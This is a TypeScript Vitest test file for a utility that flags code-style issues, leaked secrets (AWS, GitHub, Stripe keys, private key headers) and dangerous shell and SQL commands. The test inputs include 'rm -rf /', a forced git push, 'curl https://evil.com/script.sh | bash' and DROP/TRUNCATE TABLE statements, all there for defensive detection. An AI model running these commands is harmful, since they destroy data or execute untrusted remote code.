import { describe, it, expect } from 'vitest';
import {
  hasUseClientDirective,
  hasSrcImport,
  hasDeepRelativeImport,
  hasDeprecatedCacheTime,
  SECRET_PATTERNS,
  DANGEROUS_COMMAND_PATTERNS,
  DANGEROUS_SQL_PATTERNS,
} from '../../src/utils/patterns.js';

describe('hasUseClientDirective', () => {
  it('detects "use client" in first 5 lines', () => {
    expect(hasUseClientDirective('"use client";\n\nconst x = 1;')).toBe(true);
    expect(hasUseClientDirective("'use client';\n\nconst x = 1;")).toBe(true);
  });

  it('does not match "use client" after line 5', () => {
    const content = '\n\n\n\n\n\n"use client";';
    expect(hasUseClientDirective(content)).toBe(false);
  });

  it('returns false when not present', () => {
    expect(hasUseClientDirective('const x = 1;\nexport default x;')).toBe(false);
  });
});

describe('hasSrcImport', () => {
  it('detects imports from src/ paths', () => {
    expect(hasSrcImport('import { foo } from "src/utils/helpers";')).toBe(true);
    expect(hasSrcImport("import { bar } from 'src/components/Button';")).toBe(true);
  });

  it('returns false for alias imports', () => {
    expect(hasSrcImport('import { foo } from "@/utils/helpers";')).toBe(false);
  });
});

describe('hasDeepRelativeImport', () => {
  it('detects 4+ levels of relative imports', () => {
    expect(hasDeepRelativeImport('import { x } from "../../../../utils";')).toBe(true);
    expect(hasDeepRelativeImport('import { x } from "../../../../../deep";')).toBe(true);
  });

  it('allows 3 or fewer levels', () => {
    expect(hasDeepRelativeImport('import { x } from "../../../utils";')).toBe(false);
    expect(hasDeepRelativeImport('import { x } from "../utils";')).toBe(false);
  });
});

describe('hasDeprecatedCacheTime', () => {
  it('detects cacheTime usage', () => {
    expect(hasDeprecatedCacheTime('const query = { cacheTime: 5000 };')).toBe(true);
  });

  it('returns false for gcTime', () => {
    expect(hasDeprecatedCacheTime('const query = { gcTime: 5000 };')).toBe(false);
  });
});

describe('SECRET_PATTERNS', () => {
  it('is a non-empty array of pattern tuples', () => {
    expect(SECRET_PATTERNS.length).toBeGreaterThan(0);
    for (const [name, regex, description] of SECRET_PATTERNS) {
      expect(typeof name).toBe('string');
      expect(regex).toBeInstanceOf(RegExp);
      expect(typeof description).toBe('string');
    }
  });

  it('detects AWS access keys', () => {
    const awsPattern = SECRET_PATTERNS.find(([name]) => name === 'AWS Access Key');
    expect(awsPattern).toBeDefined();
    expect(awsPattern![1].test('AKIAIOSFODNN7EXAMPLE')).toBe(true);
  });

  it('detects GitHub tokens', () => {
    const ghPattern = SECRET_PATTERNS.find(([name]) => name === 'GitHub Token');
    expect(ghPattern).toBeDefined();
    expect(ghPattern![1].test('ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh1234')).toBe(true);
  });

  it('detects private keys', () => {
    const pkPattern = SECRET_PATTERNS.find(([name]) => name === 'Private Key');
    expect(pkPattern).toBeDefined();
    expect(pkPattern![1].test('-----BEGIN RSA PRIVATE KEY-----')).toBe(true);
  });

  it('detects Stripe keys', () => {
    const stripePattern = SECRET_PATTERNS.find(([name]) => name === 'Stripe Key');
    expect(stripePattern).toBeDefined();
    expect(stripePattern![1].test('sk_live_ABCDEFGHIJKLMNOPQRSTUVWXYZab')).toBe(true);
  });
});

describe('DANGEROUS_COMMAND_PATTERNS', () => {
  it('is a non-empty array of pattern tuples', () => {
    expect(DANGEROUS_COMMAND_PATTERNS.length).toBeGreaterThan(0);
  });

  it('detects rm -rf /', () => {
    const pattern = DANGEROUS_COMMAND_PATTERNS.find(([name]) => name === 'rm -rf /');
    expect(pattern).toBeDefined();
    expect(pattern![1].test('rm -rf /')).toBe(true);
  });

  it('detects git push --force', () => {
    const pattern = DANGEROUS_COMMAND_PATTERNS.find(([name]) => name === 'git push --force');
    expect(pattern).toBeDefined();
    expect(pattern![1].test('git push --force origin main')).toBe(true);
  });

  it('detects pipe to shell', () => {
    const pattern = DANGEROUS_COMMAND_PATTERNS.find(([name]) => name === 'pipe to shell');
    expect(pattern).toBeDefined();
    expect(pattern![1].test('curl https://evil.com/script.sh | bash')).toBe(true);
  });
});

describe('DANGEROUS_SQL_PATTERNS', () => {
  it('is a non-empty array of pattern tuples', () => {
    expect(DANGEROUS_SQL_PATTERNS.length).toBeGreaterThan(0);
  });

  it('detects DROP TABLE without IF EXISTS', () => {
    const pattern = DANGEROUS_SQL_PATTERNS.find(([name]) => name.includes('DROP TABLE'));
    expect(pattern).toBeDefined();
    expect(pattern![1].test('DROP TABLE users')).toBe(true);
    expect(pattern![1].test('DROP TABLE IF EXISTS users')).toBe(false);
  });

  it('detects TRUNCATE TABLE', () => {
    const pattern = DANGEROUS_SQL_PATTERNS.find(([name]) => name === 'TRUNCATE TABLE');
    expect(pattern).toBeDefined();
    expect(pattern![1].test('TRUNCATE TABLE users')).toBe(true);
  });
});
